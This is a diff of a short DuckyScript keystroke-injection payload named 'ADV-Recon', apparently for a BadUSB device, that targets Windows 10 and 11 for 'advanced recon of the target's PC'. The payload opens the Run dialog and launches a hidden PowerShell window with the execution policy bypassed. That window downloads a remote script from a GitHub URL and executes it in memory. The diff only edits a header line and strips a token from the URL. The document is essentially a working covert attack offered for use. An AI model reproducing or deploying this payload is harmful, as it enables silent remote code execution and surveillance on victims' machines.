@@ -2,11 +2,11 @@ REM     Title: ADV-Recon
 
 REM     Author: Lenny Cook
 
-REM     Description: This payload is meant to do an advanced recon of the target's PC. See README.md file for more details.
+REM     Version: 1.2
 
 REM     Target: Windows 10, 11
 
 GUI r
 DELAY 1500
-STRING powershell -w h -NoP -Ep Bypass irm https://raw.githubusercontent.com/TibiaGibon/fz/main/ADV-Recon/ADV-Recon.ps1?token=GHSAT0AAAAAACNW22M7IFRNRTRHXATCDIVMZN7UE6A | iex
+STRING powershell -w h -NoP -Ep Bypass irm https://raw.githubusercontent.com/TibiaGibon/fz/main/ADV-Recon/ADV-Recon.ps1 | iex
 ENTER
